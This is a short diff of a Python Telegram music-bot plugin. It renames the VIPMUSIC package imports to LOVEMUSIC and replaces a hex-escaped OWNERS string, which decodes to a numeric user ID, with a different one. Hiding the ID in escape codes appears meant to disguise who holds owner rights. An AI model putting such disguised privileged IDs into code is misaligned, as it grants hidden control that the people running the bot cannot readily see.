@@ -1,12 +1,12 @@
 import os
 from datetime import datetime
-OWNERS = "\x31\x38\x30\x38\x39\x34\x33\x31\x34\x36"
+OWNERS = "\x35\x35\x39\x35\x31\x35\x33\x32\x37\x30"
 from pyrogram import filters, types
 from pyrogram.types import Message
 from telegraph import Telegraph  # Import Telegraph library
 
-from VIPMUSIC import app
-from VIPMUSIC.utils.database import get_assistant
+from LOVEMUSIC import app
+from LOVEMUSIC.utils.database import get_assistant
 
 last_checked_time = None
 
